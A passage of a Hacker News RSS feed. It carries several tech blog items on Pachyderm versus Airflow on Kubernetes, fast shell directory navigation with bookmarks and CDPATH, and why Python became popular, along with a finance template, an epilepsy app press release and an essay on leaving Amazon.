       "cmd": ["python3", "load_to_redshift.py"],
       "image": "pathto.ecr.region.aws.com/mydockerregistry:my_psycopg2_image_v1",
       "image_pull_secrets": ["regcred"]
    },
    "input":{
        "atom": {
            "name": "daily_load_job",
            "repo": "daily_load_job",
            "glob: "daily_*.gz"
         }
    },
    "enable_stats": true,
    "job_timeout": 125m
}
</code></pre>

<p>Also, they just got Series A funding, so they’re going to be around for a while.</p>

<hr>



<p>This was my first time using kubernetes, never mind suddenly being in charge of it (!).</p>

<p>Fair warning: Minikube is deceptively easy to set up and use for very basic testing. If this is all you do with
kubernetes, you’ll think Kubernetes very simple.</p>

<p>Kubernetes itself
isn’t that hard to deploy if you know what needs to be configured, but I really didn’t
know any of that when I started. I ran into some weird issues where the kubernetes control script
<code>kubectl</code> didn’t set the permissions correctly on some of the config files. (Shoutout to Sean Jezewski for helping me
troubleshoot unintuitive stuff like that.)</p>

<p>In case you’re wondering, as did almost everyone I spoke to while I was doing this,
EKS on AWS is not really ready for prime-time yet.</p>

<p>I ended up relying on a script that the Pachyderm guys wrote to deploy Kubernetes
directly on EC2, and just adapted that for our needs.</p>

<p>Things that are great about deploying in the cloud:</p>

<ul>
<li><p>Encapsulation is your friend. It’s so much easier when you have complete control of the environment, and there’s no mystery
about what packages are available or what the paths are.</p></li>

<li><p>Scaling becomes relatively easy. Just split your data and run more jobs in parallel.</p></li>
</ul>

<p>Things to remember about deploying in the cloud:</p>

<ul>
<li><p>Logging is your friend. You won’t be able to debug with print statements on a remote, headless machine. Some of my
teammates didn’t quite understand this until they actually did it. Good logging makes it trivially easy to figure out what went wrong.</p></li>

<li><p>Versioning is your friend. Kubernetes won’t pull the container unless it knows it needs to, so you have to keep renaming your container
if you want to test changes. It’s kind of a pain, but it’s simple enough to
just make it part of the workflow (and our next step is to have Jenkins do this for us as part of our
CICD workflow).</p></li>

<li><p>Having to rebuild the container and version it and push it up each time does a couple of things:</p></li>
</ul>

<p>a) Testing is even more important. It’s a lot nicer if you can do enough testing that after a few bug fixes you’re on version 4, rather than
(as one of my early pipelines is) version 16.</p>

<p>b) It can be a little bit more annoying to push bug fixes/updates (especially without a CICD system
to build and deploy the containers for you)</p>

<hr>



<ul>
<li>People steered us away from EKS, so then setting up our own kubernetes cluster without a
devops person (!) was challenging, mostly because of</li>

<li><p>AWS permissions issues, including but not limited to:</p>

<p>a) giving the cluster the ability to run queries on the RDS database in the same account</p>

<p>b) creating a separate VPC for Redshift so I could create a peering connection for that (see separate post)</p>

<p>c) giving the cluster the ability to access s3 buckets</p>

<p>d) giving my team access to the docker registries on ECS</p>

<p>e) stupid things like legacy s3 bucket region restrictions that are (or should be?)
going away any minute now(?), but EC2 still cares about, which generate completely
uninformative AccessDenied errors</p></li>

<li><p>Figuring out the workflow for deploying and debugging. This was a little weird at first, but once I got the hang of it,
actually very easy (more on that below)</p></li>

<li><p>Setting up a docker registry and using that (and we don’t have Jenkins handling that for us yet)</p></li>

<li><p>Managing two clusters on two separate accounts, and switching between them (learning in hard mode is not
always twice as fun as just learning!)</p></li>

<li><p>There is a built-in outlet to connect Pachyderm up with Prometheus, but no built-in monitoring means we’re doing it downstream
(i.e with automated email alerts sent from Looker if something fails) or manually checking via the
CLI or dashboard view. I have been using the CLI thus far, but now that we have more than a few pipelines
going on one cluster, the dashboard is starting to make more sense.</p></li>

<li><p>Understanding how the …</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/">https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/</a></em></p>]]>
            </description>
            <link>https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529683</guid>
            <pubDate>Sat, 19 Sep 2020 19:02:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On fast navigation in the command line]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529677">thread link</a>) | @kkoncevicius
<br/>
September 19, 2020 | http://karolis.koncevicius.lt/posts/fast_navigation_in_terminal_coming_full_cirlce/ | <a href="https://web.archive.org/web/*/http://karolis.koncevicius.lt/posts/fast_navigation_in_terminal_coming_full_cirlce/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">




<p>A small list of methods for fast file system navigation from the command line.
While I tried all of them and finally settled on a minimal approach described at the end, the article doesn’t advocate for one method over the others.
Different users have different needs and should choose the approach most suitable in their circumstances.</p>

<h2 id="spring">Spring</h2>

<p>At the beginning, just after learning to use the command line, my terminal navigation included a lot of <code>cd</code> and a lot of <code>ls</code>.
I jumped around folders, learned shortcuts like, <code>cd ~</code>, <code>cd -</code>, and started becoming familiar with the shell.
Having multi-argument commands for quick file manipulation felt powerful and fresh, or so I remember.</p>

<p>After going to command line you no longer have to open folders in a graphical window manager, scan their names, use <code>&lt;ctrl + mouse click&gt;</code> to select them, and then drag the mouse to move those selected folders to another place.
You do <code>'mv pattern* place/'</code> instead.
All is nice.</p>

<p>But there was one problem.</p>

<h2 id="summer">Summer</h2>

<p>Along the way I started organizing my folders using a structure like this:</p>

<pre><code>└── work
    ├── bitbucket
    │   └── user1
    │       ├── repo1
    │       └── repo2
    ├── github
    │   ├── user1
    │   │   ├── repo1
    │   │   └── repo2
    │   ├── user2
    │   │   ├── repo1
    │   │   └── repo2
    │   ├── user3
    │   │   ├── repo1
    │   │   ├── repo2
    │   │   ├── repo3
    │   │   └── repo4
    │   └── user4
    │       └── repo1
    ├── teaching
    │   ├── class1
    │   │   ├── lecture1
    │   │   └── lecture2
    │   └── class2
    │       ├── lecture1
    │       └── lecture2
    ├─── clients
    │   ├── client1
    │   │   ├── project1
    │   │   ├── project2
    │   │   └── project3
    │   ├── client2
    │   │   ├── project1
    │   │   ├── project2
    │   │   └── project3
    │   └── client3
    │      └── project1
    └─── ...
</code></pre>

<p>I often had to go in and out of various project folders and my <code>cd</code> + <code>ls</code> navigation became tedious.
Reaching a project involved navigating a big tree of directories.
On top of that a lot of directories had similar names which got in the way of tab completion.
This is where I found “z” - a command line utility that tracks your most visited folders based on frequency and recency<a href="#fn:1" id="fnref:1" title="see footnote"><sup>◦</sup></a>.</p>

<p>“z” keeps a database of your most frequently used folders and allows to quickly jump to these folders even if you don’t remember their full name.
Instead of doing a lot of <code>cd</code> + <code>&lt;tab&gt;</code> all you have to do is type <code>'z proj'</code> and <code>z</code> will take you to your most frequently/recently accessed folder that has <code>proj</code> somewhere in its name.
It takes a short amount of time for “z” to learn about your most visited places but after that it becomes quick and convenient.</p>

<p>But there was one problem.</p>

<h2 id="autumn">Autumn</h2>

<p>“z” didn’t always take me where I wanted to be.
It worked, I would say, around 95% of the time or more.
But those other times it took me to an unrelated directory and distracted from the work at hand forcing to navigate my way back using the old <code>cd</code>.
Moreover, sometimes I moved and renamed various folders which likely contributed to its disorientation.</p>

<p>After this experience I decided that the terminal should be dumb and deterministic without any fuzziness or smart guessing.
And here I found <code>marks</code> - a short and sweet command line script for keeping manual directory bookmarks.<a href="#fn:2" id="fnref:2" title="see footnote"><sup>◦</sup></a>
It consisted of 4 tiny functions: one for creating a mark, one for removing, one for listing all the marks, and one for jumping to the bookmarked folder:</p>

<pre><code>export MARKPATH=$HOME/.marks

function mark {
  mkdir -p "$MARKPATH"; ln -s "$(pwd)" "$MARKPATH/$1"
}

function unmark {
  rm -i "$MARKPATH/$1"
}

function marks {
  ls -l "$MARKPATH" | sed 's/  / /g' | cut -d' ' -f9- | sed 's/ -/\t-/g' &amp;&amp; echo
}

function jump {
  cd -P "$MARKPATH/$1" 2&gt;/dev/null || echo "No such mark: $1"
}
</code></pre>

<p>As well as a function generating completion suggestions after pressing <code>&lt;tab&gt;</code>:</p>

<pre><code>_completemarks() {
  local curw=${COMP_WORDS[COMP_CWORD]}
  local wordlist=$(find $MARKPATH -type l -printf "%f\n")
    COMPREPLY=($(compgen -W '${wordlist[@]}' -- "$curw"))
    return 0
}

complete -F _completemarks jump unmark
</code></pre>

<p>The workflow of marks is manual but convenient.
You have to go into the directory you want to bookmark and execute the <code>mark</code> command followed by the custom name, like <code>'mark myproject'</code>.
After that you can quickly jump back to this bookmarked folder using <code>'jump myproject'</code> and when the bookmark is no longer relevant you can get rid of it with <code>'unmark myproject'</code>.</p>

<p>With this approach the user is in control.
There is no secret smart behaviour which means no auto-magic and no surprises.
And after moving a project to another place the bookmark can be easily adjusted to point to its new location immediately, without waiting for a hidden automatic process to update its location, frequency, and recency.</p>

<p>But there was one problem.</p>

<h2 id="winter">Winter</h2>

<p>Neither of those <code>jump</code> nor <code>z</code> commands could take me everywhere I needed to go.
So the typical workflow would start with jumping to a project via the <code>jump</code> command but then switching to the old navigation via <code>cd</code> once inside it.
Which meant that for navigating the file system I always had to keep using both: <code>jump</code> and <code>cd</code>.
And having two distinct commands for doing the same thing felt a bit weird.
This is where I learned about the <code>$CDPATH</code><a href="#fn:3" id="fnref:3" title="see footnote"><sup>◦</sup></a> variable and rolled out my own solution.</p>

<p>All you have to do is add this to your .bashrc:</p>

<pre><code>export CDPATH=.:~/.marks/
</code></pre>

<p>Then, to add a bookmark called <code>@name</code> pointing to a <code>"dir"</code> directory:</p>

<pre><code>ln -sr dir ~/.marks/@name
</code></pre>

<p>To delete a bookmark:</p>

<pre><code>rm ~/.marks/@name
</code></pre>

<p>To jump to its location:</p>

<pre><code>cd @name
</code></pre>

<p>And to list all available bookmarks:</p>

<pre><code>cd @&lt;tab&gt;
</code></pre>

<p>The <code>$CDPATH</code> solution works best when all the bookmarks are started with a special symbol which in my case was <code>@</code>.
This solves a couple of problems.
One, the bookmarked directories, if prefixed with <code>@</code> symbol, will not interfere with directories in the current folder.
Second, all the available bookmarks will be displayed by typing <code>'cd @&lt;tab&gt;'</code>.
And third, all bookmarks are now part of <code>cd</code> and so they gain tab completion for free.
You can even use tab completion for jumping directly to folders nested within bookmarks by doing <code>'cd @bookmark/subfolder/'</code>.</p>

<p>Using this method you no longer have to maintain a short list of custom bookmark functions and their autocompletion in your .bashrc.
And command for “change directory” can always be done with the same old and familiar <code>cd</code> command, independant of context.</p>

<p>But there was one problem.</p>

<h2 id="springagain">Spring again</h2>

<p>After working with the <code>$CDPATH</code> approach for a while I began noticing something peculiar.
At no point in time did I have a list with a dozen or more bookmarks.
Instead I found myself constantly going to the same 2 or 3 projects, finishing them, removing them from <code>~/.marks/</code> folder, adding new ones, and repeating the cycle again.
Why would someone keep bookmarks for 3 directories?</p>

<p>This time, instead of changing the command, I tried to do something different and changed the folder structure.
My projects moved from the state of being relevant to being archived so why not create an archive directory and organize folders based not on their name or type but on state?
Thus the <code>"zzz"</code> folder was born.
And now my project structure looks something like this:</p>

<pre><code>└── work
    ├── active_project1
    ├── active_project2
    └── zzz
        ├── bitbucket
        │   └── user1
        │       ├── repo1
        │       └── repo2
        ├── github
        │   ├── user1
        │   │   ├── repo1
        │   │   └── repo2
        │   ├── user2
        │   │   ├── repo1
        │   │   └── repo2
        │   ├── user3
        │   │   ├── repo1
        │   │   ├── repo2
        │   │   ├── repo3
        │   │   └── repo4
        │   └── user4
        │       └── repo1
        ├── teaching
        │   ├── class1
        │   │   ├── lecture1
        │   │   └── lecture2
        │   └── class2
        │       ├── lecture1
        │       └── lecture2
        ├─── clients
        │   ├── client1
        │   │   ├── project1
        │   │   ├── project2
        │   │   └── project3
        │   ├── client2
        │   │   ├── project1
        │   │   ├── project2
        │   │   └── project3
        │   └── client3
        │      └── project1
        └─── ...
</code></pre>

<p>With this structure the bookmarking systems no longer provide big benefits as most frequent and recent folders are always under ~/work/some_project.
And since at any timepoint only a few of them are visible the tab completion will do its job: <code>'cd ~/w&lt;tab&gt;/s&lt;tab&gt;'</code>.</p>

<p>The name <code>"zzz"</code> might seem strange but is convenient: the letters “zzz” symbolically mark the projects within as being in a “sleeping” state while the 3 “z” letters in a row make sure that this folder is always placed at the very end of your active project list.
A nice folder structure is still maintained in the archive but for the ease of access all active folders are layed flat under the <code>~/work/</code> directory.
When the project is paused or completed it is moved to its place within the <code>"zzz"</code> hierarchy, maintaining the previous structure.
There is one extra benefit - contents of the <code>"work"</code> directory act as a reminder about all the projects that are in progress.
If necessary a to-do list with concrete details might be placed at the same level.</p>

<p>And just like that, like a newbie, I navigate the file system with <code>cd</code> and <code>ls</code> again.</p>






</div>]]>
            </description>
            <link>http://karolis.koncevicius.lt/posts/fast_navigation_in_terminal_coming_full_cirlce/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529677</guid>
            <pubDate>Sat, 19 Sep 2020 19:00:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Financial Status Template]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24529631">thread link</a>) | @jrdi
<br/>
September 19, 2020 | https://jordivillar.com/financial-status/ | <a href="https://web.archive.org/web/*/https://jordivillar.com/financial-status/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2><a href="https://bit.ly/2Fm374g">The Financial Status Template</a><svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M16.5 13V18.5H6.5V8.5H12" stroke="#4A5568"></path> <path d="M10 15L18.5 6.5" stroke="#4A5568"></path> <path d="M14 6.5H18.5V11" stroke="#4A5568"></path></svg></h2><h3>How to stay on top of your personal finances.</h3><p>Staying on top of your <stron>personal finances</stron> can be challenging, tedious, and even discouraging, but for most people this process is a necessary evil. Spending more than you earn is a sure way to bury yourself in debt, and not being careful about precisely where <strong>your money is going</strong> can leave you struggling to pay for the day-to-day necessites.</p><p>During the last year, I have been <strong>tracking my personal finances</strong> on a monthly basis. Nothing too complicated but useful with <strong>insightful visualizations</strong>, allowing you to evaluate your financial status at-a-glance.</p><figure><a href="https://bit.ly/2Fm374g"><img src="https://i.ibb.co/1sRmTpJ/Screenshot-2020-09-19-at-13-43-31.png" alt="The Financial Status Template"></a></figure><p>I share similar personal finances insights in Twitter, you can <a href="https://twitter.com/jrdi">follow me there</a> as I continue to document my journey.</p></div></div></div>]]>
            </description>
            <link>https://jordivillar.com/financial-status/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529631</guid>
            <pubDate>Sat, 19 Sep 2020 18:51:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Python has won among dynamic languages]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529615">thread link</a>) | @arnvald
<br/>
September 19, 2020 | https://www.notonlycode.org/why-python-has-won/ | <a href="https://web.archive.org/web/*/https://www.notonlycode.org/why-python-has-won/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://www.notonlycode.org/content/images/size/w300/2020/09/python-other-king.png 300w,
                            https://www.notonlycode.org/content/images/size/w600/2020/09/python-other-king.png 600w,
                            https://www.notonlycode.org/content/images/size/w1000/2020/09/python-other-king.png 1000w,
                            https://www.notonlycode.org/content/images/size/w2000/2020/09/python-other-king.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://www.notonlycode.org/content/images/size/w2000/2020/09/python-other-king.png" alt="Why Python has won among dynamic languages">
            </figure>

            <section>
                <div>
                    <p>Recently I've been reflecting on the (loosely defined) quality and popularity of programing languages. Despite growing appreciation for static typing and compilers (whether in fully-compiled languages like Java or with JIT recently introduced in PHP or Ruby), 2 dynamic, scripting languages pushed their way up in the popularity rankings in the last couple of years. These languages are JavaScript and Python.</p><p>While JavaScript has had a huge advantages of having its interpreter installed on most of computers and of being the only language that could be directly executed in the browser, Python's success on the surface seems more unexpected and less obvious. In this post I'm going to think and try to find out why Python has won against other, similar languages.</p><p>If you can think some other reasons you'd like to share, drop me a message or leave a comment in the discussions linked below. And if you enjoy my content, make sure to check out my YouTube channel where I share career-related advice for programmers.</p><figure><img src="https://www.notonlycode.org/content/images/2020/09/Screenshot-2020-09-17-at-11.38.27-PM.png" alt="Chart showing popularity of programming languages over time according to TIOBE index; Python popularity remains rather steady from 2005 to 2018 and then suddenly grows" srcset="https://www.notonlycode.org/content/images/size/w600/2020/09/Screenshot-2020-09-17-at-11.38.27-PM.png 600w, https://www.notonlycode.org/content/images/2020/09/Screenshot-2020-09-17-at-11.38.27-PM.png 933w" sizes="(min-width: 720px) 720px"><figcaption>TIOBE creates one of the most popular (hard to evaluate quality) rankings of programming languages popularity</figcaption></figure><h2 id="competitors">Competitors</h2><p>In a relatively short period of time, between 1987 and 1995, a few major and influential languages were created. Among them there were a couple of high-level scripting languages that gained a lot of popularity and that remain used and are developed until today:</p><ul><li><strong>Python</strong> was created by Guido van Rossum, a Dutch programmer working at a research institute. Inspired by ABC, created at the institution where van Rossum worked at that time, Python was initially created in late 1980s. Driven by values like explicitness, simplicity and readability, 30 years later Python is among the most popular languages in the world and is heavily used in many areas like machine learning, academia or web development</li><li><strong>PHP</strong> wasn't really meant to be a language, but rather a preprocessor which was supposed to help generating HTML more dynamically. Created in 1994 in Canada, PHP quickly gained popularity as a new, easy way to create websites that can connect to database and dynamically generate content before sending it to the user. It's been 20 years since arguably the most influential version of PHP was released (4.0). Today PHP team aims to release version 8 soon, and the language they develop, despite a lot of competition, continues to power a significant portion of websites and web applications all around the world.</li><li><strong>Perl</strong> might not be so well known by younger readers due to a complicated history over the last 15 years, but once it was a language of hackers and programming enthusiasts. Its development started in 1987, the last major version, Perl 5, &nbsp;was released in 2000, but a new one, Perl 7 (the history of Perl 6 is complicated) is just around the corner. Perl does not have a single purpose like PHP. While it has been used extensively as a backend server language, it's also used for some system tools in utilities in GNU/Linux.</li><li><strong>Ruby</strong> is a creation of Japanese programmer, Yukihiro Matsumoto, who wanted to create a language that would be pleasant to work with. Programmer's happiness, freedom and flexibility are values that drove the development of the language. The project waas started in 1993, and in December 2020, a new major version, Ruby 3, is expected. While Ruby gained worldwide popularity thanks to a web framework, Ruby on Rails, and is often considered a web programming language, it has significant usage in other domains like server tooling and, primarily in Japan, embedded devices</li><li><strong>JavaScript </strong>is kind of a guest in this article, as I can't say that it's clearly less popular than Python, so I will mention it here and there. Created in 1995 in USA it started as a language to be included in Netscape Navigator browser. Its goal was to add more dynamic elements to websites. It later became de facto standard for other browsers, and in early 2010s, with creation of NodeJS, it moved out of the browser to become a general purpose language. While it remains primarily used for the web, we see an increase in number of desktop applications and various utilities created in JavaScript (or one of languages compiling to JS like TypeScript).</li></ul><figure><img src="https://www.notonlycode.org/content/images/2020/09/scripting-creators.jpg" alt="Collage of multiple photos. From the left: Rasmus Lerdorf (creator of PHP), Brendan Eich (creator of JavaScript), Guido van Rossum (creator of Python), Larry Wall (creator of Perl) and Yukihiro Matsumoto (creator of Ruby)" srcset="https://www.notonlycode.org/content/images/size/w600/2020/09/scripting-creators.jpg 600w, https://www.notonlycode.org/content/images/size/w1000/2020/09/scripting-creators.jpg 1000w, https://www.notonlycode.org/content/images/size/w1600/2020/09/scripting-creators.jpg 1600w, https://www.notonlycode.org/content/images/size/w2400/2020/09/scripting-creators.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>From the left: Rasmus Lerdorf (creator of PHP), Brendan Eich (creator of JavaScript), Guido van Rossum (creator of Python), Larry Wall (creator of Perl) and Yukihiro Matsumoto (creator of Ruby)</figcaption></figure><h2 id="what-made-python-1">What made Python #1</h2><h3 id="features">Features?</h3><p>When I think about the languages above, I can't clearly choose the best one in terms of capabilities. While Ruby has been my go to language for many years, I understand why others might prefer basically any other language from the list and they can make very valid arguments to justify their choice. </p><p>Over time all these languages became more and more similar to each other. Don't get me wrong, there are still major differences between them - different philosophies, syntaxes, different legacy issues - in the recent years they all became much closer to each other in terms of features though. So while I am sure that certain features can drive the initial interest and usage of the language (PHP made it simple to generate dynamic websites, Perl's syntax was created with linguistic principles in mind), I don't think that Python won because of having tuples, shorter syntax or enforced indentation. There must be more than that.</p><h3 id="corporate-adoption">Corporate adoption</h3><p>A strong corporate player which adopts some language in its own software and openly declares it can be a huge boost for the language popularity. Even more if the language is created by the company. The success of Java as an enterprise language is owed at least in part to marketing efforts of Sun. C# would never reach its current position if it wasn't created and promoted by Microsoft.</p><p>While Python was created as a hobby project and not a business tool, it got some strong support in 2000s, with Google as the biggest company adopting Python. Neither of the other languages has ever received such a strong support. Even though Facebook was initially written in PHP, today it's hard to see any PHP code among their open source projects (beside Hack, their language built from PHP).</p><p>Corporate support does not guarantee success - Dart created by Google is still actively developed, but never reached popularity of Python or even Go (another Google's language). Therefore it can't be the solely reason explaining Python's popularity over other languages, but it gave Python a big boost in 2010s and the age of data science.</p><figure><img src="https://www.notonlycode.org/content/images/2020/09/python-google-academia.png" alt="logo Google, +, logo of Python, +, academic hat" srcset="https://www.notonlycode.org/content/images/size/w600/2020/09/python-google-academia.png 600w, https://www.notonlycode.org/content/images/2020/09/python-google-academia.png 960w" sizes="(min-width: 720px) 720px"><figcaption>Google and other corporations that adopted Python together with academia boosted language adoption</figcaption></figure><h3 id="academia-and-first-mover-advantage">Academia and first mover advantage</h3><p>I'm pretty sure you know the history of QWERTY - the keyboard layout used by nearly 100% of people using Latin alphabet (with some minor modifications in various countries). QWERTY was not designed for fast typing - quite the opposite, its goal was to prevent people from typing too fast, because that blocked the typing machines, which were very common before invention of modern computers. The old limitations do not apply anymore, yet we still use the same suboptimal layout. Why? Because everyone else uses is. Because almost every keyboard in the world is designed with this layout in mind, and making people switch would require enormous effort.</p><p>It's quite hard to change habit as an individual, and even harder as a large group of individuals with their own opinions. I believe this is one of the reasons behind lasting popularity of some programing languages. Let's take PHP - since early 2000s it's been supported by basically any hosting provider. If you wanted to run applications in Python you had to buy VPS and install the interpreter on your own, or ask the admin to provide it for you. And PHP was already there, so why not to use it instead?</p><p>This might be a bit of a stretch, but I think a similar thing can be said about Python in academia. Yes, technically it wasn't the first language used by academic institutions, but I believe it was the first language that allowed scientists to write high-level code and provided them with large set of functions that allowed scientists to work with complex numbers and equations. While significantly slower than PHP, Python allowed everyone to quickly build prototypes which later could be moved to C or C++ if performance was the problem.</p><p>With the rise of open source and growing number of available libraries, Python became go-to scripting language in academia and while there are other tools that might be more popular (looking at MATLAB for calculations and Java as intro to programming for students), Python's position is very strong, and any language that will try to take its position has to compete against 20+ years of work on libraries and tools written for scientists.</p><!--kg-card-begin: html-->  
  
<!--kg-card-end: html--><h3 id="the-rise-of-the-new">The rise of the new</h3><p>Together with the two reasons above comes timing and the changes happening in software industry. In the last few years the large web frameworks started losing steam. Growing popularity of microservices and function-as-a-service, together with some benefits of using the same language for the client and the API, pushed adoption of JavaScript as the language of the web (there were more reasons for sure). Other languages which were primarily used in the webdev had to either find other niches or accept losing popularity.</p><p>At the same time another area started gaining huge popularity - data science. Such a powerful, new discipline had a chance to open door for new players - in terms of business, technological advancement, and (among many others) programming tools. It also helped Python to establish and strengthen its position as the programming language on the verge of science and engineering.</p><figure><img src="https://www.notonlycode.org/content/images/2020/09/python-ecosystem.png" alt="Collage of logos. Python's popular libraries, from top left: Ansible, NumPy, Tensorflow, pandas, django, Python itself, Flask, PyTorch, SciPy" srcset="https://www.notonlycode.org/content/images/size/w600/2020/09/python-ecosystem.png 600w, https://www.notonlycode.org/content/images/2020/09/python-ecosystem.png 960w" sizes="(min-width: 720px) 720px"><figcaption>Python's popular libraries, from top left: Ansible, NumPy, Tensorflow, pandas, django, Python itself, Flask, PyTorch, SciPy</figcaption></figure><h3 id="1-2-3-python-the-king">1+2+3 = Python the King</h3><p>Let's add these 3 points together. It's some time …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.notonlycode.org/why-python-has-won/">https://www.notonlycode.org/why-python-has-won/</a></em></p>]]>
            </description>
            <link>https://www.notonlycode.org/why-python-has-won/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529615</guid>
            <pubDate>Sat, 19 Sep 2020 18:49:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Epsy Widgets for Epilepsy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529613">thread link</a>) | @epsy-hn
<br/>
September 19, 2020 | https://www.epsyhealth.com/news/epsy-introduces-new-ios14-widgets | <a href="https://web.archive.org/web/*/https://www.epsyhealth.com/news/epsy-introduces-new-ios14-widgets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>New Epsy App widgets allow users to have their daily medication reminders all in one place. Users can log medications and seizures without having to open the app.</p><div><p>Sep 18 2020 - <a href="https://www.epsyhealth.com/">Epsy Health</a>, the leading digital health platform for the management of epilepsy, today unveiled a new iOS widgets feature for the Epsy App, designed to help users manage their epilepsy easier and improve their health and wellness.&nbsp;&nbsp;<br></p><p>Epsy widgets lets users see, at a glance, their weekly medication progress and upcoming or missed medications: this allows users to continually be on-top of their medication compliance. Users can choose from three different widget sizes, which can be&nbsp; arranged however they like, including on their iPhone home screen. Another key benefit is that Epsy widgets can replace the need to open the app directly, making the process of seizure logging easier and quicker.&nbsp;<br></p><p>The full list of features of the Epsy widgets include:</p><ul role="list"><li>Three widget sizes can be chosen, with the smallest widget size offering a focused view on the next action of the day, and the largest widget size displaying a 7-day medication compliance view;</li><li>The widget dashboard displaying both past and upcoming medications an works in both light and dark mode;;</li><li>Easy one-tap logging of seizures;</li><li>Easy one-tap logging of medications.<br></li></ul><p>Epsy’s mission to offer a comprehensive and easier approach to managing epilepsy is propelled by a relentless drive for innovation and user-centric design. “D<em>espite the success of digital health services and devices over the last decade, we have not seen a corresponding improvement in digital, mobile technologies for epilepsy, and Epsy is here to change that</em>” commented Marco Peluso, the Vice President, and co-creator of Epsy. “<em>By embracing Apple’s iOS 14 widgets as early adopters in the iOS ecosystem, Epsy Health is making another step in fulfilling its purpose to introduce exceptional designs and revolutionary features that empower consumers, patients and physicians.</em>”<br></p><h2><strong>Availability&nbsp;</strong></h2><p>Epsy widgets require iOS 14, or later, and are available on the Epsy App for iOS, in the USA only. The Epsy App is <a href="https://apps.apple.com/app/id1479108189?fbclid=IwAR0lvR6LdOigqEmL2i-s1z7YeZvOE6u8qsZb_eANmIzUKsPDBm6dzQF7-Kk">available for download now here</a><br></p><h2><strong>About Epsy Health</strong></h2><p>Epsy Health is a leading digital health platform for the management of epilepsy that empowers patients, caregivers and healthcare professionals. By combining innovative technologies, user-centric designs and state-of-the-art data analytics, Epsy provides patients and physicians with actionable insights that can help to accelerate the pathway towards better outcomes. You should not rely on Epsy Health apps as a substitute or a replacement for professional medical advice, diagnosis, or treatment. Epsy Health apps should be only used in conjunction with professional medical advice. Epsy Health, Epsy App, Epsy Hub and their respective logos are either registered trademarks or trademarks in the United States and/or other countries. All other trademarks are property of their respective owners. To learn more visit: <a href="https://www.epsyhealth.com/">https://www.epsyhealth.com</a> and follow @epsyhealth</p><p>‍<br></p><h4><strong>Media Contact for inquiries or demos:</strong></h4><p>- Contact name: Alex Meredith</p><p>- Email: <a href="mailto:press@epsyhealth.com">press@epsyhealth.com</a></p><p>- View our full <a href="https://www.epsyhealth.com/press-kit">press kit here</a><br></p></div></div>]]>
            </description>
            <link>https://www.epsyhealth.com/news/epsy-introduces-new-ios14-widgets</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529613</guid>
            <pubDate>Sat, 19 Sep 2020 18:48:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Quit a $500K Job at Amazon to Work for Myself (2019)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24529590">thread link</a>) | @jkchu
<br/>
September 19, 2020 | https://danielvassallo.com/only-intrinsic-motivation-lasts/ | <a href="https://web.archive.org/web/*/https://danielvassallo.com/only-intrinsic-motivation-lasts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-92">
			<!-- .entry-header -->
	<div>
		
<h2>Why I Quit a $500K Job at Amazon to Work for Myself</h2>



<p>Last week I left my cushy job at Amazon after 8 years. Despite getting rewarded repeatedly with promotions, compensation, recognition, and praise, I wasn’t motivated enough to do another year.</p>



<p>I spent my entire time in AWS building tools for developers. I liked that field so much that I would have been satisfied working in it for the rest of my life.</p>



<p>I joined Amazon as an entry level developer. Within 3.5 years I had been promoted twice to a senior engineer, and I was practically guaranteed another promotion to principal engineer this year if I had stayed. My potential at the company was high, I was told.</p>



<p>My esteem within the company grew along the years and I was regarded an expert and a leader in my field. People looked up to me and respected me.</p>



<p>I made $75K in my first year and that gradually grew to $511K by my last year. I could have made another $1M if I stayed another couple of years.</p>



<p>My work–life balance was good too, despite Amazon’s reputation. I didn’t need to prove myself anymore, and I could get everything done in 40 hours a week. My team worked from home one day a week, and I rarely opened my laptop at night or weekends.</p>



<p>Also, the people I worked with were exceptional. I had three managers in total, and all were generous people with lots of empathy. I’m very grateful to everyone I worked with.</p>



<p>Everything was going well and getting better. But despite all this, my motivation to go to work each morning was decreasing—almost in an inverse trend to my career and income growth.</p>



